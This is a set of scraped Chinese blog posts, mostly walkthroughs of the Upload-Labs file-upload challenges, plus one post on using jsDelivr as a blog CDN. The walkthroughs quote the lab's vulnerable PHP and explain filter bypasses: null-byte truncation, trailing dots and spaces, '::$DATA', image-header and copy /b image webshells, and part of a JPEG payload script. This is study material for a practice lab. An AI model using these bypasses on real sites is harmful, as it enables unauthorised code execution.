checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u0026gt;binData = \u0026#39;\u0026#39;; $this-\u0026gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); $this-\u0026gt;binData = file_get_contents($filename); } else { $this-\u0026gt;binData = $filename; } $this-\u0026gt;size = strlen($this-\u0026gt;binData); } public function seek() { return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); } public function skip($skip) { $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); } public function readByte() { if($this-\u0026gt;eof()) { die(\u0026#39;End Of File\u0026#39;); } $byte = substr($this-\u0026gt;binData, 0, 1); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u0026gt;binData) \u0026lt; 2) { die(\u0026#39;End Of File\u0026#39;); } $short = substr($this-\u0026gt;binData, 0, 2); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); if($this-\u0026gt;order) { $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); } } ?\u0026gt; 准备 ​\t准备一个yoo.jpg图片，上传经过渲染以后再下载下到本地，保存为1.jpg。\n插入代码 ​\t使用脚本处理1.jpg插入php代码，执行命令php jpg_payload.php 1.jpg。php命令执行方法上面有。执行成功以后应该如图所示：\n​\t执行的目录下会多出一个名为payload_1.jpg的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。\n上传并验证 ​\t上传以后同样先确定图片的名称和地址，适用文件包含进行验证\n​\t如果如图所示，我们的图片马就上传成功了。需要提醒：有些图片不行可能需要多换几个图片试一试！！！\n呼，终于可以休息了。\n","date":"2020-11-16T22:50:25Z","permalink":"https://www.braindance.top/articles/2020/11/upload-labs%E4%B9%8Bpass-16/","title":"Upload-Labs之Pass-16"},{"content":"前言 ​\t继续接着上一次的Upload-labs往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。\n​\t在线靶机地址：\nlinux环境 windows环境 Pass-11 ​\t(这题使用了windows环境)\n​\t源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_ext = substr($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],strrpos($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],\u0026#34;.\u0026#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = $_GET[\u0026#39;save_path\u0026#39;].\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else{ $msg = \u0026#34;只允许上传.jpg|.png|.gif类型文件！\u0026#34;; } } ​\t分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了$_GET['save_path']，本题提示也写道\n本pass上传路径可控！，就是通过这个GET变量控制上传路径。\n​\t这一关的突破方法需要有一些条件：php版本需要低于5.3.29（我使用的是php版本5.3.17的本地靶机），另一个条件是magic_quotes_gpc需要为关闭状态。magic_quotes_gpc的作用官方文档写道：\nWarning 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。\n​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 \u0026rsquo; (单引号)、\u0026quot; (双引号)、\\（反斜杠）和 NUL\u0026rsquo;s 被一个反斜杠自动转义。\n​\t使用bp抓包并添加0x00截断，在GET请求中可以使用url编码的截断：%00。贴个自己参考的博客，截断上传原理剖析。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了$_GET['save_path']变量的值，但是我们在这个变量后面添加了0x00截断，所以后面的代码便不会执行，文件也就不会被重命名。\n​\t文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由..../upload/233.php�/5120201115205501.jpg变为..../upload/233.php。完工\nPass-12 ​\t（windows环境）\n​\t这题和上一题差不多一样，就是把$_GET['save_path']变成了$_POST['save_path']。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过16进制修改\n​\t这里我命名为233.phpa是因为方便我在Hex表中找到这句话的位置和修改数据。a的16进制是61，需要改成截断的值：00\n​\t上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工\nPass-13 ​\t（Linux环境）\n​\t源码中有关的函数解释：\nPHP中pack、unpack的详细用法\nfread()\nfclose()\nintval()\n​\t这道题和前面题目都不一样了：\n​\t题目说道需要上传图片马，然后使用文件包含漏洞进行测试，那么我们就先制作图片马。\n​\t查看本题的提示本pass检查图标内容开头2个字节！，意思就是只检测文件前面两个字节的标识，贴一个各种格式图片文件头标识分析，所以这道题只用在上传的文件头部的两个字节处粘贴对应文件的头标识即可绕过检测。\n​\t以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入GIF89a\u0026lt;?php phpinfo(); ?\u0026gt;，后缀名无所谓了，因为题目只检测前两个字节即可上传。\n​\t还有一种方法制作图片马：使用windows的copy /b指令，把两个文件进行无缝拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：windows窗口命令——(copy/b)文件无缝拼接隐藏。\n​\t别忘了题目中说道了需要三种后缀都上传成功才算过关！\n​\t上传以后需要使用文件包含进行判定是否执行，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击2的链接进入include.php进行文件包含：网址输入https://...../include.php?file=./upload/8220201116071327.gif，找到php成功执行的页面。这里还有一个小知识点我学到的就是：路径中的\u0026rsquo;.\u0026lsquo;和\u0026rsquo;..\u0026lsquo;还有\u0026rsquo;./\u0026lsquo;和\u0026rsquo;../\u0026lsquo;都是什么意思。完工\nPass-14 ​\t（Linux环境）\n​\t这题提示写道本pass使用getimagesize()检查是否为图片文件！，和上一题不一样的地方就是使用了getimagesize()函数，这个函数的官方文档getimagesize()，所以这道题就不能用13题的加文件的头标识方法绕过，这次要使用上一题中的copy /b指令用一张正常的图片进行拼接还是可以通过的。\n​\tPS：听同学说getimagesize()不过是检测了前八个字节，不过我没试。\n​\t因为是拼接的，所以要直接摸到图片最底部查看成功。完工\nPass-15 ​\t（Linux环境）\n​\t13、14、15题都是对文件的头标识进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用copy /b制作的图片马可以直接通过。\n​\t网上搜集过来的资料\npng 文件头 89504E470D0A1A0A\njpg 文件头 89504E470D0A1A0A\ngif 文件头 474946383961\n​\t这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工\n","date":"2020-11-16T16:04:30Z","permalink":"https://www.braindance.top/articles/2020/11/upload-labs%E4%B8%89/","title":"Upload-Labs(三)"},{"content":"前言 ​\t这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。\nCDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科\n在犹豫要不要买的时候，发现了这个东西：jsdelivr，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞\n1. 新建仓库 ​\t名字重了是因为我已经创建好了并且使用了以后才来写的博客。\n2. 克隆Git仓库到本地 ​\t在自己电脑建个文件夹然后打开git输入git clone 你仓库的链接，把刚刚创建的仓库拉倒本地方便上传到仓库。\n廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：Git简介。\n3. 上传需要加速的资源 ​\t把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。\n1 2 3 4 git status //查看状态 git add . //添加所有文件到暂存区 git commit -m \u0026#39;第一次提交\u0026#39; //把文件提交到仓库 git push //推送至远程仓库 ​\t这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。\n​\t接下来是要上传哪些文件，我使用的是butterfly这个主题，主题github支持一下作者，直接在主题theme/butterfly文件夹下面找到资源文件夹source发现里面都是一些零碎的文件，但是在发布文件夹public下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚\n穷人流下了不争气的泪。传！(真加速还得选好服务器)\n​\t这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。\n​\t做法：配置文件里找到引用的是本地资源的项，然后在生成网站的public文件下找到对应的资源文件。\n我列一下我在配置文件里修改的项：main_css、main、utils、local_search、algolia_js、translate，因为使用的是Valine评论，里面可以设置自定义表情，我也使用这个方法修改了。\n3. 获取地址 ​\t官网首页很清楚的写明了如何获取资源链接\n​\thttps://cdn.jsdelivr.net/gh/user/repo@version/file，user就是你的github用户名，repo@version，仓库加上版本号，file就是仓库下的路径。\n​\t这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接reop@分支名，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。\n​\t贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/penginman/PicBed@master/top_img/83531406_p0.png\n​\t这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。\n4. 引用链接 ​\t配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了你现在引用的是之前的上传的静态资源，别忘啦！别忘啦！别忘啦！\n​\t我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。\n​\t还有我整理的Valine评论的自定义表情，大伙可以直接拿去用：图片地址，emojimap。完工\n","date":"2020-11-11T21:37:53Z","permalink":"https://www.braindance.top/articles/2020/11/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/","title":"jsDelivr加速静态博客"},{"content":"前言 ​\t这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { //这里下面是过滤 $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.html\u0026#34;, ......); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 //这里下面是移动文件。 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 过滤部分：\n$deny_ext是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。\n$file_name = trim($FILES['upload_file']['name'])这段代码有两个点需要说：\n$FILES['upload_file']['name']是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：PHP $_FILES函数详解。 trim()函数的作用就是去除文件名称前后的空格换行符等。 $file_name = deldot($file_name)这个注释中很清楚，是删除文章末尾的点。\n$file_ext = strrchr($file_name, '.')中strrchr(string s1,char c1)函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。\n$file_ext = strtolower($file_ext)注释上转换小写。\n$file_ext = str_ireplace('::$DATA', '', $file_ext)去除字符串::$DATA。第八题讲了原理\n上传部分：\nin_array($file_ext, $deny_ext)判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。 $_FILES['upload_file']['tmp_name']文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。 $img_path = UPLOAD_PATH.'/'.$file_name这个变量是设置需要保存到的路径 move_uploaded_file($temp_file, $img_path)本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。 Pass-06 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); $file_name = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件不允许上传\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t看源码发现少了trim()函数对文件名前后的空格处理，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php (有空格)绕过黑名单数组。\n​\t上传以后访问文件执行成功。完工\n​\t这里说明一下，我前面是在BUUCTF在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06\u0026ndash;\u0026gt;github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。\n​\nPass-07 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t这道题少了删除文件名末尾的点，我们可以通过构造2333.php. .(末尾加 点 空格 点)，被解析后文件后缀就会成为\u0026quot;. \u0026ldquo;(一个点一个空格)，可以绕过黑名单，访问的文件名是2333.php. .\n​\t我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个\u0026rdquo;.\u0026quot;，尝试在windows靶机上测试只添加一个点，访问的文件名为2333.php、2333.php.都可以，因为windows会删除最后一个点。\n​\t两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工\nPass-08 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t审查代码发现少了对::$DATA字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：\nphp在window的时候如果文件名+\u0026quot;::$DATA\u0026quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\u0026quot;::$DATA\u0026quot;之前的文件名\n​\t直接上传的时候抓包在文件名后面添加::$DATA。\n​\t上传访问。完工\nPass-09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过strrchr()函数截取后缀名转换小写。\n​\t所以和第七题一样构造2333.php. .(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点\u0026quot;.\u0026quot;，铁定不在黑名单后缀里，实现绕过后缀检查。\n​\t但是这道题只能使用windows环境，因为执行了deldot()函数删除了最后一个点之后，文件名成了2333.php.，而linux环境下因为不会自动删除最后一个点而不能访问成功。\n​\t图前面有了就不贴了。\nPass-10 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;php\u0026#34;,\u0026#34;php5\u0026#34;,\u0026#34;php4\u0026#34;,\u0026#34;php3\u0026#34;,\u0026#34;php2\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;htm\u0026#34;,\u0026#34;phtml\u0026#34;,\u0026#34;pht\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;jspa\u0026#34;,\u0026#34;jspx\u0026#34;,\u0026#34;jsw\u0026#34;,\u0026#34;jsv\u0026#34;,\u0026#34;jspf\u0026#34;,\u0026#34;jtml\u0026#34;,\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;asa\u0026#34;,\u0026#34;asax\u0026#34;,\u0026#34;ascx\u0026#34;,\u0026#34;ashx\u0026#34;,\u0026#34;asmx\u0026#34;,\u0026#34;cer\u0026#34;,\u0026#34;swf\u0026#34;,\u0026#34;htaccess\u0026#34;); 